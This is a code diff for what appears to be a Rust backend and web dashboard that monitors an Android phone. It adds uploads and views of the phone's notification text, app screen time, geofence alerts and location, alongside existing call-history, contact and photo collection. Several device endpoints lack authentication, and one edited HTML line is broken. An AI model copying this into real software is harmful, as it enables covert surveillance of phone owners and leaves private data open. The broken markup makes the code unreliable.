@@ -198,6 +198,73 @@ struct CallHistoryUploadRequest {
     calls: Vec<SharedCallRecord>,
 }
 
+#[derive(Deserialize, Serialize, Clone)]
+struct SharedNotification {
+    package_name: Option<String>,
+    app_name: Option<String>,
+    title: Option<String>,
+    text: Option<String>,
+    post_time_ms: i64,
+}
+
+#[derive(Deserialize)]
+struct NotificationsUploadRequest {
+    device_id: String,
+    notifications: Vec<SharedNotification>,
+}
+
+#[derive(Deserialize, Serialize, Clone)]
+struct DeviceAlertRequest {
+    device_id: String,
+    alert_type: String,
+    severity: Option<String>,
+    title: String,
+    message: String,
+    alert_time_ms: Option<i64>,
+}
+
+#[derive(Deserialize, Serialize, Clone)]
+struct SharedGeofence {
+    id: Option<i32>,
+    name: String,
+    latitude: f64,
+    longitude: f64,
+    radius_meters: f64,
+    is_active: Option<bool>,
+}
+
+#[derive(Deserialize)]
+struct CreateGeofenceRequest {
+    name: String,
+    latitude: f64,
+    longitude: f64,
+    radius_meters: f64,
+}
+
+#[derive(Deserialize, Serialize, Clone)]
+struct GeofenceEventRequest {
+    device_id: String,
+    geofence_name: String,
+    transition_type: String,
+    latitude: Option<f64>,
+    longitude: Option<f64>,
+    event_time_ms: Option<i64>,
+}
+
+#[derive(Deserialize, Serialize, Clone)]
+struct SharedAppUsage {
+    package_name: String,
+    app_name: String,
+    total_time_foreground_ms: i64,
+    last_time_used_ms: i64,
+}
+
+#[derive(Deserialize)]
+struct AppUsageUploadRequest {
+    device_id: String,
+    usage_stats: Vec<SharedAppUsage>,
+}
+
 #[derive(Deserialize)]
 struct MediaUploadRequest {
     device_id: String,
@@ -550,6 +617,277 @@ async fn upload_call_history(
     }))
 }
 
+async fn upload_notifications(
+    State(state): State<AppState>,
+    Json(request): Json<NotificationsUploadRequest>,
+) -> Result<Json<LocationResponse>, (StatusCode, String)> {
+    require_pending_capability_request(&state, &request.device_id, "notifications").await?;
+    let mut transaction = state.db.begin().await.map_err(|_| {
+        (StatusCode::INTERNAL_SERVER_ERROR, "Could not start notifications upload".to_string())
+    })?;
+    sqlx::query("DELETE FROM device_notifications WHERE device_id = $1")
+        .bind(&request.device_id)
+        .execute(&mut *transaction)
+        .await
+        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not replace notifications".to_string()))?;
+    for notification in &request.notifications {
+        sqlx::query(
+            "INSERT INTO device_notifications (device_id, package_name, app_name, title, text, post_time_ms) VALUES ($1, $2, $3, $4, $5, $6)",
+        )
+        .bind(&request.device_id)
+        .bind(&notification.package_name)
+        .bind(&notification.app_name)
+        .bind(&notification.title)
+        .bind(&notification.text)
+        .bind(notification.post_time_ms)
+        .execute(&mut *transaction)
+        .await
+        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not save notification".to_string()))?;
+    }
+    sqlx::query(
+        "UPDATE devices SET last_command_status = $2, last_command_status_time = NOW(), last_seen = NOW() WHERE device_id = $1",
+    )
+    .bind(&request.device_id)
+    .bind(format!("{} current notification(s) uploaded", request.notifications.len()))
+    .execute(&mut *transaction)
+    .await
+    .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not update notification status".to_string()))?;
+    transaction.commit().await.map_err(|_| {
+        (StatusCode::INTERNAL_SERVER_ERROR, "Could not finish notifications upload".to_string())
+    })?;
+    mark_capability_request_fulfilled(&state, &request.device_id, "notifications").await?;
+
+    Ok(Json(LocationResponse {
+        message: format!("{} current notification(s) uploaded", request.notifications.len()),
+    }))
+}
+
+async fn upload_device_alert(
+    State(state): State<AppState>,
+    Json(request): Json<DeviceAlertRequest>,
+) -> Result<Json<LocationResponse>, (StatusCode, String)> {
+    let severity = request.severity.unwrap_or_else(|| "info".to_string());
+    sqlx::query(
+        "INSERT INTO device_alerts (device_id, alert_type, severity, title, message, created_at) VALUES ($1, $2, $3, $4, $5, NOW())",
+    )
+    .bind(&request.device_id)
+    .bind(&request.alert_type)
+    .bind(&severity)
+    .bind(&request.title)
+    .bind(&request.message)
+    .execute(&state.db)
+    .await
+    .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not save alert".to_string()))?;
+
+    sqlx::query(
+        "UPDATE devices SET last_command_status = $2, last_command_status_time = NOW(), last_seen = NOW() WHERE device_id = $1",
+    )
+    .bind(&request.device_id)
+    .bind(format!("Alert: {}", request.title))
+    .execute(&state.db)
+    .await
+    .ok();
+
+    println!("Alert received from {}: {} - {}", request.device_id, request.title, request.message);
+
+    Ok(Json(LocationResponse {
+        message: format!("Alert '{}' saved", request.title),
+    }))
+}
+
+async fn upload_geofence_event(
+    State(state): State<AppState>,
+    Json(request): Json<GeofenceEventRequest>,
+) -> Result<Json<LocationResponse>, (StatusCode, String)> {
+    let title = format!("Geofence {}: {}", request.transition_type, request.geofence_name);
+    let message = format!("Device {} geofence safety zone '{}'.", if request.transition_type == "ENTER" { "entered" } else { "left" }, request.geofence_name);
+    let severity = if request.transition_type == "EXIT" { "warning" } else { "info" };
+
+    sqlx::query(
+        "INSERT INTO device_alerts (device_id, alert_type, severity, title, message, created_at) VALUES ($1, 'geofence_breach', $2, $3, $4, NOW())",
+    )
+    .bind(&request.device_id)
+    .bind(severity)
+    .bind(&title)
+    .bind(&message)
+    .execute(&state.db)
+    .await
+    .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not save geofence alert".to_string()))?;
+
+    if let (Some(lat), Some(lon)) = (request.latitude, request.longitude) {
+        sqlx::query(
+            "UPDATE devices SET latitude = $2, longitude = $3, location_time = NOW(), last_command_status = $4, last_command_status_time = NOW(), last_seen = NOW() WHERE device_id = $1",
+        )
+        .bind(&request.device_id)
+        .bind(lat)
+        .bind(lon)
+        .bind(&title)
+        .execute(&state.db)
+        .await
+        .ok();
+    }
+
+    Ok(Json(LocationResponse {
+        message: format!("Geofence event '{}' processed", title),
+    }))
+}
+
+async fn create_geofence(
+    State(state): State<AppState>,
+    Path(device_id): Path<String>,
+    headers: HeaderMap,
+    Json(request): Json<CreateGeofenceRequest>,
+) -> Result<Json<LocateResponse>, (StatusCode, String)> {
+    require_dashboard_auth(&headers).map_err(|(status, _, message)| (status, message))?;
+    sqlx::query(
+        "INSERT INTO device_geofences (device_id, name, latitude, longitude, radius_meters, is_active, created_at) VALUES ($1, $2, $3, $4, $5, TRUE, NOW())",
+    )
+    .bind(&device_id)
+    .bind(&request.name)
+    .bind(request.latitude)
+    .bind(request.longitude)
+    .bind(request.radius_meters)
+    .execute(&state.db)
+    .await
+    .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not save geofence".to_string()))?;
+
+    if let Ok(fcm_token) = read_device_fcm_token(&state, &device_id).await {
+        let _ = send_firebase_data_command(
+            fcm_token,
+            serde_json::json!({
+                "command": "sync_geofences"
+            }),
+        )
+        .await;
+    }
+
+    Ok(Json(LocateResponse {
+        message: format!("Geofence '{}' created", request.name),
+    }))
+}
+
+async fn list_geofences(
+    State(state): State<AppState>,
+    Path(device_id): Path<String>,
+    headers: HeaderMap,
+) -> Result<Json<Vec<SharedGeofence>>, DashboardAuthError> {
+    require_dashboard_auth(&headers)?;
+    let rows = sqlx::query("SELECT id, name, latitude, longitude, radius_meters, is_active FROM device_geofences WHERE device_id = $1 ORDER BY created_at DESC")
+        .bind(&device_id)
+        .fetch_all(&state.db)
+        .await
+        .unwrap_or_default();
+
+    let geofences = rows.into_iter().map(|row| SharedGeofence {
+        id: Some(row.get::<i32, _>("id")),
+        name: row.get::<String, _>("name"),
+        latitude: row.get::<f64, _>("latitude"),
+        longitude: row.get::<f64, _>("longitude"),
+        radius_meters: row.get::<f64, _>("radius_meters"),
+        is_active: Some(row.get::<bool, _>("is_active")),
+    }).collect();
+
+    Ok(Json(geofences))
+}
+
+async fn query_geofences(
+    State(state): State<AppState>,
+    Path(device_id): Path<String>,
+) -> Result<Json<Vec<SharedGeofence>>, (StatusCode, String)> {
+    let rows = sqlx::query("SELECT id, name, latitude, longitude, radius_meters, is_active FROM device_geofences WHERE device_id = $1 AND is_active = TRUE")
+        .bind(&device_id)
+        .fetch_all(&state.db)
+        .await
+        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not query geofences".to_string()))?;
+
+    let geofences = rows.into_iter().map(|row| SharedGeofence {
+        id: Some(row.get::<i32, _>("id")),
+        name: row.get::<String, _>("name"),
+        latitude: row.get::<f64, _>("latitude"),
+        longitude: row.get::<f64, _>("longitude"),
+        radius_meters: row.get::<f64, _>("radius_meters"),
+        is_active: Some(row.get::<bool, _>("is_active")),
+    }).collect();
+
+    Ok(Json(geofences))
+}
+
+async fn delete_geofence(
+    State(state): State<AppState>,
+    Path((device_id, id)): Path<(String, i32)>,
+    headers: HeaderMap,
+) -> Result<Json<LocateResponse>, (StatusCode, String)> {
+    require_dashboard_auth(&headers).map_err(|(status, _, message)| (status, message))?;
+    let result = sqlx::query("DELETE FROM device_geofences WHERE device_id = $1 AND id = $2")
+        .bind(&device_id)
+        .bind(id)
+        .execute(&state.db)
+        .await
+        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete geofence".to_string()))?;
+
+    if result.rows_affected() == 0 {
+        return Err((StatusCode::NOT_FOUND, "Geofence was not found".to_string()));
+    }
+
+    if let Ok(fcm_token) = read_device_fcm_token(&state, &device_id).await {
+        let _ = send_firebase_data_command(
+            fcm_token,
+            serde_json::json!({
+                "command": "sync_geofences"
+            }),
+        )
+        .await;
+    }
+
+    Ok(Json(LocateResponse {
+        message: "Geofence deleted".to_string(),
+    }))
+}
+
+async fn upload_app_usage(
+    State(state): State<AppState>,
+    Json(request): Json<AppUsageUploadRequest>,
+) -> Result<Json<LocationResponse>, (StatusCode, String)> {
+    require_pending_capability_request(&state, &request.device_id, "app_usage").await?;
+    let mut transaction = state.db.begin().await.map_err(|_| {
+        (StatusCode::INTERNAL_SERVER_ERROR, "Could not start app-usage upload".to_string())
+    })?;
+    sqlx::query("DELETE FROM device_app_usage WHERE device_id = $1")
+        .bind(&request.device_id)
+        .execute(&mut *transaction)
+        .await
+        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not replace app usage".to_string()))?;
+    for item in &request.usage_stats {
+        sqlx::query(
+            "INSERT INTO device_app_usage (device_id, package_name, app_name, total_time_foreground_ms, last_time_used_ms, created_at) VALUES ($1, $2, $3, $4, $5, NOW())",
+        )
+        .bind(&request.device_id)
+        .bind(&item.package_name)
+        .bind(&item.app_name)
+        .bind(item.total_time_foreground_ms)
+        .bind(item.last_time_used_ms)
+        .execute(&mut *transaction)
+        .await
+        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not save app usage item".to_string()))?;
+    }
+    sqlx::query(
+        "UPDATE devices SET last_command_status = $2, last_command_status_time = NOW(), last_seen = NOW() WHERE device_id = $1",
+    )
+    .bind(&request.device_id)
+    .bind(format!("App usage stats uploaded ({} apps)", request.usage_stats.len()))
+    .execute(&mut *transaction)
+    .await
+    .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not update command status".to_string()))?;
+    transaction.commit().await.map_err(|_| {
+        (StatusCode::INTERNAL_SERVER_ERROR, "Could not finish app-usage upload".to_string())
+    })?;
+    mark_capability_request_fulfilled(&state, &request.device_id, "app_usage").await?;
+
+    Ok(Json(LocationResponse {
+        message: format!("App usage stats uploaded ({} apps)", request.usage_stats.len()),
+    }))
+}
+
 async fn upload_media(
     State(state): State<AppState>,
     Json(request): Json<MediaUploadRequest>,
@@ -849,6 +1187,8 @@ async fn request_permission_status_command(
         "microphone" => "Microphone",
         "contacts" => "Contacts",
         "phone_state" => "Phone state",
+        "notifications" | "notification" => "Notifications",
+        "usage" | "app_usage" | "usage_access" => "Usage stats access",
         _ => return Err((StatusCode::BAD_REQUEST, "Unknown permission".to_string())),
     };
 
@@ -904,6 +1244,8 @@ async fn request_capability_upload_command(
         "call_history" => ("call_history", "Current call history", None),
         "phone_details" | "phone_state" => ("phone_details", "Phone details", None),
         "gallery" | "gallery_photos" => ("gallery", "Gallery photos", None),
+        "notifications" | "notification" => ("notifications", "Device notifications", None),
+        "app_usage" | "usage" | "screen_time" => ("app_usage", "App usage statistics", None),
         _ => return Err((StatusCode::BAD_REQUEST, "Unknown capability".to_string())),
     };
 
@@ -1078,6 +1420,71 @@ async fn delete_detail_media(
     }))
 }
 
+async fn delete_detail_notification(
+    State(state): State<AppState>,
+    Path(path): Path<DeleteItemPath>,
+    headers: HeaderMap,
+) -> Result<Json<LocateResponse>, (StatusCode, String)> {
+    require_dashboard_auth(&headers).map_err(|(status, _, message)| (status, message))?;
+    let result = sqlx::query("DELETE FROM device_notifications WHERE device_id = $1 AND id = $2")
+        .bind(&path.device_id)
+        .bind(path.id)
+        .execute(&state.db)
+        .await
+        .map_err(|_| {
+            (
+                StatusCode::INTERNAL_SERVER_ERROR,
+                "Could not delete notification".to_string(),
+            )
+        })?;
+    if result.rows_affected() == 0 {
+        return Err((StatusCode::NOT_FOUND, "Notification was not found".to_string()));
+    }
+    Ok(Json(LocateResponse {
+        message: "Notification deleted".to_string(),
+    }))
+}
+
+async fn delete_detail_alert(
+    State(state): State<AppState>,
+    Path(path): Path<DeleteItemPath>,
+    headers: HeaderMap,
+) -> Result<Json<LocateResponse>, (StatusCode, String)> {
+    require_dashboard_auth(&headers).map_err(|(status, _, message)| (status, message))?;
+    let result = sqlx::query("DELETE FROM device_alerts WHERE device_id = $1 AND id = $2")
+        .bind(&path.device_id)
+        .bind(path.id)
+        .execute(&state.db)
+        .await
+        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete alert".to_string()))?;
+    if result.rows_affected() == 0 {
+        return Err((StatusCode::NOT_FOUND, "Alert was not found".to_string()));
+    }
+    Ok(Json(LocateResponse {
+        message: "Alert deleted".to_string(),
+    }))
+}
+
+async fn delete_detail_app_usage(
+    State(state): State<AppState>,
+    Path(path): Path<DeleteItemPath>,
+    headers: HeaderMap,
+) -> Result<Json<LocateResponse>, (StatusCode, String)> {
+    require_dashboard_auth(&headers).map_err(|(status, _, message)| (status, message))?;
+    let result = sqlx::query("DELETE FROM device_app_usage WHERE device_id = $1 AND id = $2")
+        .bind(&path.device_id)
+        .bind(path.id)
+        .execute(&state.db)
+        .await
+        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete app usage item".to_string()))?;
+    if result.rows_affected() == 0 {
+        return Err((StatusCode::NOT_FOUND, "App usage item was not found".to_string()));
+    }
+    Ok(Json(LocateResponse {
+        message: "App usage item deleted".to_string(),
+    }))
+}
+
 async fn delete_detail_scope(
     State(state): State<AppState>,
     Path(path): Path<DeleteScopePath>,
@@ -1128,6 +1535,34 @@ async fn delete_detail_scope(
                 .await
                 .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete call history".to_string()))?;
         }
+        "notifications" => {
+            sqlx::query("DELETE FROM device_notifications WHERE device_id = $1")
+                .bind(&path.device_id)
+                .execute(&state.db)
+                .await
+                .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete notifications".to_string()))?;
+        }
+        "alerts" => {
+            sqlx::query("DELETE FROM device_alerts WHERE device_id = $1")
+                .bind(&path.device_id)
+                .execute(&state.db)
+                .await
+                .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete alerts".to_string()))?;
+        }
+        "app_usage" => {
+            sqlx::query("DELETE FROM device_app_usage WHERE device_id = $1")
+                .bind(&path.device_id)
+                .execute(&state.db)
+                .await
+                .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete app usage".to_string()))?;
+        }
+        "geofences" => {
+            sqlx::query("DELETE FROM device_geofences WHERE device_id = $1")
+                .bind(&path.device_id)
+                .execute(&state.db)
+                .await
+                .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete geofences".to_string()))?;
+        }
         "all" => {
             let mut transaction = state.db.begin().await.map_err(|_| {
                 (
@@ -1160,6 +1595,26 @@ async fn delete_detail_scope(
                 .execute(&mut *transaction)
                 .await
                 .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete saved call history".to_string()))?;
+            sqlx::query("DELETE FROM device_notifications WHERE device_id = $1")
+                .bind(&path.device_id)
+                .execute(&mut *transaction)
+                .await
+                .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete saved notifications".to_string()))?;
+            sqlx::query("DELETE FROM device_alerts WHERE device_id = $1")
+                .bind(&path.device_id)
+                .execute(&mut *transaction)
+                .await
+                .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete saved alerts".to_string()))?;
+            sqlx::query("DELETE FROM device_app_usage WHERE device_id = $1")
+                .bind(&path.device_id)
+                .execute(&mut *transaction)
+                .await
+                .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete saved app usage".to_string()))?;
+            sqlx::query("DELETE FROM device_geofences WHERE device_id = $1")
+                .bind(&path.device_id)
+                .execute(&mut *transaction)
+                .await
+                .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete saved geofences".to_string()))?;
             transaction.commit().await.map_err(|_| {
                 (
                     StatusCode::INTERNAL_SERVER_ERROR,
@@ -1208,8 +1663,11 @@ async fn device_details_page(
     <a href="/">Back to dashboard</a>
     <h1>Device details</h1>
     <p class="muted" id="device-id"></p>
-    <p id="message"></p>
-    <section id="phone"><div class="section-head"><h2>Phone</h2><button class="danger" onclick="deleteScope('all')">Delete All Saved Data</button></div><div id="phone-content">Loading...</div></section>
+    <p     <section id="phone"><div class="section-head"><h2>Phone</h2><button class="danger" onclick="deleteScope('all')">Delete All Saved Data</button></div><div id="phone-content">Loading...</div></section>
+    <section id="alerts"><div class="section-head"><h2>Live Alerts & Security Events</h2><button class="danger" onclick="deleteScope('alerts')">Delete All Alerts</button></div><div id="alerts-content">Loading...</div></section>
+    <section id="geofences"><div class="section-head"><h2>Geofence Safety Zones</h2><button class="danger" onclick="deleteScope('geofences')">Delete All Geofences</button></div><div id="geofence-form" style="margin-bottom:12px;display:flex;gap:8px;flex-wrap:wrap;align-items:center;"><input id="geo-name" placeholder="Zone name (e.g. Home)" style="padding:6px 8px;border-radius:6px;border:1px solid #30394c;background:#121824;color:#eef2ff;"><input id="geo-lat" type="number" step="any" placeholder="Latitude" style="width:110px;padding:6px 8px;border-radius:6px;border:1px solid #30394c;background:#121824;color:#eef2ff;"><input id="geo-lon" type="number" step="any" placeholder="Longitude" style="width:110px;padding:6px 8px;border-radius:6px;border:1px solid #30394c;background:#121824;color:#eef2ff;"><input id="geo-radius" type="number" placeholder="Radius (meters)" value="200" style="width:110px;padding:6px 8px;border-radius:6px;border:1px solid #30394c;background:#121824;color:#eef2ff;"><button onclick="addGeofence()">+ Add Geofence</button></div><div id="geofences-content">Loading...</div></section>
+    <section id="app_usage"><div class="section-head"><h2>App Usage & Screen Time</h2><button class="danger" onclick="deleteScope('app_usage')">Delete App Usage</button></div><div id="usage-content">Loading...</div></section>
+    <section id="notifications"><div class="section-head"><h2>Device Notifications</h2><button class="danger" onclick="deleteScope('notifications')">Delete All Notifications</button></div><div id="notifications-content">Loading...</div></section>
     <section id="contacts"><div class="section-head"><h2>Contacts Shared By User</h2><button class="danger" onclick="deleteScope('contacts')">Delete All Contacts</button></div><div id="contacts-content">Loading...</div></section>
     <section id="calls"><div class="section-head"><h2>Current Call History</h2><button class="danger" onclick="deleteScope('call_history')">Delete Call History</button></div><div id="calls-content">Loading...</div></section>
     <section id="photos"><div class="section-head"><h2>Photos Shared By User</h2><button class="danger" onclick="deleteScope('photos')">Delete All Photos</button></div><div id="photos-content">Loading...</div></section>
@@ -1237,11 +1695,28 @@ async fn device_details_page(
       didInitialScroll = true;
       requestAnimationFrame(() => target.scrollIntoView({{behavior:'smooth', block:'start'}}));
     }}
+    function formatDuration(ms) {{
+      const sec = Math.floor(ms / 1000);
+      const hrs = Math.floor(sec / 3600);
+      const mins = Math.floor((sec % 3600) / 60);
+      const remSec = sec % 60;
+      if (hrs > 0) return `${{hrs}}h ${{mins}}m`;
+      if (mins > 0) return `${{mins}}m ${{remSec}}s`;
+      return `${{remSec}}s`;
+    }}
     async function load() {{
       if (audioIsPlaying()) return;
       const response = await fetch('/devices/'+encodeURIComponent(deviceId)+'/details-data?t='+Date.now(), {{cache:'no-store'}});
       const data = await response.json();
       byId('phone-content').innerHTML = `<table><tr><th>Manufacturer</th><td>${{text(data.device.manufacturer)}}</td></tr><tr><th>Model</th><td>${{text(data.device.model)}}</td></tr><tr><th>Android</th><td>${{text(data.device.android_version)}}</td></tr><tr><th>Last seen</th><td>${{text(data.device.last_seen)}}</td></tr></table>`;
+      
+      byId('alerts-content').innerHTML = data.alerts && data.alerts.length ? `<table><thead><tr><th>Severity</th><th>Event</th><th>Details</th><th>When</th><th>Action</th></tr></thead><tbody>${{data.alerts.map(a=>`<tr><td><span style="padding:3px 8px;border-radius:4px;font-weight:700;font-size:12px;background:${{a.severity==='critical'?'#d75067':a.severity==='warning'?'#eab308':'#3b82f6'}}">${{text(a.severity)}}</span></td><td><strong>${{text(a.title)}}</strong></td><td>${{text(a.message)}}</td><td>${{new Date(a.created_at).toLocaleString()}}</td><td><button class="danger" onclick="deleteAlert(${{a.id}})">Delete</button></td></tr>`).join('')}}</tbody></table>` : '<p class="muted">No alerts or security events logged yet.</p>';
+      
+      byId('geofences-content').innerHTML = data.geofences && data.geofences.length ? `<table><thead><tr><th>Name</th><th>Center (Lat, Lon)</th><th>Radius</th><th>Status</th><th>Action</th></tr></thead><tbody>${{data.geofences.map(g=>`<tr><td><strong>${{text(g.name)}}</strong></td><td>${{g.latitude.toFixed(5)}}, ${{g.longitude.toFixed(5)}}</td><td>${{g.radius_meters}} m</td><td>${{g.is_active ? '<span style="color:#4ade80">Active</span>' : '<span style="color:#aab5cd">Inactive</span>'}}</td><td><button class="danger" onclick="deleteGeofenceItem(${{g.id}})">Delete</button></td></tr>`).join('')}}</tbody></table>` : '<p class="muted">No geofences created yet. Use the form above to add a safety zone.</p>';
+      
+      byId('usage-content').innerHTML = data.app_usage && data.app_usage.length ? `<table><thead><tr><th>App Name</th><th>Foreground Screen Time</th><th>Last Used</th><th>Action</th></tr></thead><tbody>${{data.app_usage.map(u=>`<tr><td><strong>${{text(u.app_name)}}</strong><br><small class="muted">${{text(u.package_name)}}</small></td><td><strong>${{formatDuration(u.total_time_foreground_ms)}}</strong></td><td>${{new Date(u.last_time_used_ms).toLocaleString()}}</td><td><button class="danger" onclick="deleteAppUsageItem(${{u.id}})">Delete</button></td></tr>`).join('')}}</tbody></table>` : '<p class="muted">No app usage stats uploaded yet.</p>';
+
+      byId('notifications-content').innerHTML = data.notifications && data.notifications.length ? `<table><thead><tr><th>App</th><th>Title</th><th>Message / Content</th><th>When</th><th>Action</th></tr></thead><tbody>${{data.notifications.map(n=>`<tr><td><strong>${{text(n.app_name || n.package_name)}}</strong><br><small class="muted">${{text(n.package_name)}}</small></td><td>${{text(n.title)}}</td><td>${{text(n.text)}}</td><td>${{new Date(n.post_time_ms).toLocaleString()}}</td><td><button class="danger" onclick="deleteNotification(${{n.id}})">Delete</button></td></tr>`).join('')}}</tbody></table>` : '<p class="muted">No notifications uploaded yet.</p>';
       byId('contacts-content').innerHTML = data.contacts.length ? `<table><thead><tr><th>Name</th><th>Phone</th><th>Action</th></tr></thead><tbody>${{data.contacts.map(c=>`<tr><td>${{text(c.name)}}</td><td>${{text(c.phone)}}</td><td><button class="danger" onclick="deleteContact(${{c.id}})">Delete</button></td></tr>`).join('')}}</tbody></table>` : '<p class="muted">No contacts uploaded yet.</p>';
       const callCounts = data.calls.reduce((counts, call) => {{ const key = call.phone_number || call.cached_name || 'unknown'; counts[key] = (counts[key] || 0) + 1; return counts; }}, {{}});
       byId('calls-content').innerHTML = data.calls.length ? `<table><thead><tr><th>Name / Number</th><th>Type</th><th>When</th><th>Duration</th><th>Calls in snapshot</th></tr></thead><tbody>${{data.calls.map(c=>{{ const key = c.phone_number || c.cached_name || 'unknown'; return `<tr><td>${{text(c.cached_name || c.phone_number)}}</td><td>${{text(c.call_type)}}</td><td>${{new Date(c.called_at_ms).toLocaleString()}}</td><td>${{Math.floor(c.duration_seconds / 60)}}m ${{c.duration_seconds % 60}}s</td><td>${{callCounts[key]}}</td></tr>`; }}).join('')}}</tbody></table>` : '<p class="muted">No call-history snapshot uploaded yet.</p>';
@@ -1262,6 +1737,18 @@ async fn device_details_page(
       await load();
       setTimeout(() => message(''), 1500);
     }}
+    function deleteAlert(id) {{
+      deleteRequest('/devices/'+encodeURIComponent(deviceId)+'/details/alerts/'+id, 'Delete this alert?');
+    }}
+    function deleteGeofenceItem(id) {{
+      deleteRequest('/devices/'+encodeURIComponent(deviceId)+'/geofences/'+id, 'Delete this geofence?');
+    }}
+    function deleteAppUsageItem(id) {{
+      deleteRequest('/devices/'+encodeURIComponent(deviceId)+'/details/app-usage/'+id, 'Delete this app usage item?');
+    }}
+    function deleteNotification(id) {{
+      deleteRequest('/devices/'+encodeURIComponent(deviceId)+'/details/notifications/'+id, 'Delete this notification?');
+    }}
     function deleteContact(id) {{
       deleteRequest('/devices/'+encodeURIComponent(deviceId)+'/details/contacts/'+id, 'Delete this contact?');
     }}
@@ -1269,8 +1756,31 @@ async fn device_details_page(
       deleteRequest('/devices/'+encodeURIComponent(deviceId)+'/details/media/'+id, 'Delete this saved item?');
     }}
     function deleteScope(scope) {{
-      const labels = {{photos:'all photos', voice:'all voice notes', contacts:'all contacts', call_history:'current call history', all:'all saved photos, voice notes, contacts, and call history'}};
+      const labels = {{photos:'all photos', voice:'all voice notes', contacts:'all contacts', call_history:'current call history', notifications:'all notifications', alerts:'all alerts', app_usage:'all app usage stats', geofences:'all geofences', all:'all saved data'}};
       deleteRequest('/devices/'+encodeURIComponent(deviceId)+'/details/'+scope, 'Delete '+(labels[scope] || scope)+'?');
+    }}
+    async function addGeofence() {{
+      const name = byId('geo-name').value.trim();
+      const lat = parseFloat(byId('geo-lat').value);
+      const lon = parseFloat(byId('geo-lon').value);
+      const radius = parseFloat(byId('geo-radius').value) || 200;
+      if (!name || isNaN(lat) || isNaN(lon)) {{
+        alert('Please fill out Name, Latitude, and Longitude');
+        return;
+      }}
+      const response = await fetch('/devices/'+encodeURIComponent(deviceId)+'/geofences', {{
+        method: 'POST',
+        headers: {{ 'Content-Type': 'application/json' }},
+        body: JSON.stringify({{ name, latitude: lat, longitude: lon, radius_meters: radius }})
+      }});
+      if (!response.ok) {{
+        message('Failed to add geofence');
+        return;
+      }}
+      byId('geo-name').value = '';
+      message('Geofence added');
+      await load();
+      setTimeout(() => message(''), 1500);
     }}
     load();
     setInterval(load, 3000);
@@ -1300,11 +1810,43 @@ async fn device_details_data(
     let Some(device) = device else {
         return Ok(Json(serde_json::json!({
             "device": { "device_id": device_id },
+            "alerts": [],
+            "geofences": [],
+            "app_usage": [],
+            "notifications": [],
             "contacts": [],
             "calls": [],
             "media": []
         })));
     };
+    let alerts = sqlx::query(
+        "SELECT id, alert_type, severity, title, message, created_at FROM device_alerts WHERE device_id = $1 ORDER BY created_at DESC LIMIT 100",
+    )
+    .bind(&device_id)
+    .fetch_all(&state.db)
+    .await
+    .unwrap_or_default();
+    let geofences = sqlx::query(
+        "SELECT id, name, latitude, longitude, radius_meters, is_active FROM device_geofences WHERE device_id = $1 ORDER BY created_at DESC",
+    )
+    .bind(&device_id)
+    .fetch_all(&state.db)
+    .await
+    .unwrap_or_default();
+    let app_usage = sqlx::query(
+        "SELECT id, package_name, app_name, total_time_foreground_ms, last_time_used_ms FROM device_app_usage WHERE device_id = $1 ORDER BY total_time_foreground_ms DESC LIMIT 100",
+    )
+    .bind(&device_id)
+    .fetch_all(&state.db)
+    .await
+    .unwrap_or_default();
+    let notifications = sqlx::query(
+        "SELECT id, package_name, app_name, title, text, post_time_ms FROM device_notifications WHERE device_id = $1 ORDER BY post_time_ms DESC LIMIT 200",
+    )
+    .bind(&device_id)
+    .fetch_all(&state.db)
+    .await
+    .unwrap_or_default();
     let contacts = sqlx::query(
         "
         SELECT id, name, phone
@@ -1316,7 +1858,7 @@ async fn device_details_data(
     .bind(&device_id)
     .fetch_all(&state.db)
     .await
-    .unwrap();
+    .unwrap_or_default();
     let media = sqlx::query(
         "
         SELECT id, media_type, content_type, base64_data, created_at
@@ -1329,14 +1871,14 @@ async fn device_details_data(
     .bind(&device_id)
     .fetch_all(&state.db)
     .await
-    .unwrap();
+    .unwrap_or_default();
     let calls = sqlx::query(
         "SELECT cached_name, phone_number, call_type, called_at_ms, duration_seconds FROM device_call_history WHERE device_id = $1 ORDER BY called_at_ms DESC LIMIT 100",
     )
     .bind(&device_id)
     .fetch_all(&state.db)
     .await
-    .unwrap();
+    .unwrap_or_default();
 
     Ok(Json(serde_json::json!({
         "device": {
@@ -1346,6 +1888,37 @@ async fn device_details_data(
             "android_version": device.get::<Option<String>, _>("android_version"),
             "last_seen": device.get::<Option<chrono::NaiveDateTime>, _>("last_seen")
         },
+        "alerts": alerts.into_iter().map(|row| serde_json::json!({
+            "id": row.get::<i32, _>("id"),
+            "alert_type": row.get::<String, _>("alert_type"),
+            "severity": row.get::<String, _>("severity"),
+            "title": row.get::<String, _>("title"),
+            "message": row.get::<String, _>("message"),
+            "created_at": row.get::<chrono::NaiveDateTime, _>("created_at")
+        })).collect::<Vec<_>>(),
+        "geofences": geofences.into_iter().map(|row| serde_json::json!({
+            "id": row.get::<i32, _>("id"),
+            "name": row.get::<String, _>("name"),
+            "latitude": row.get::<f64, _>("latitude"),
+            "longitude": row.get::<f64, _>("longitude"),
+            "radius_meters": row.get::<f64, _>("radius_meters"),
+            "is_active": row.get::<bool, _>("is_active")
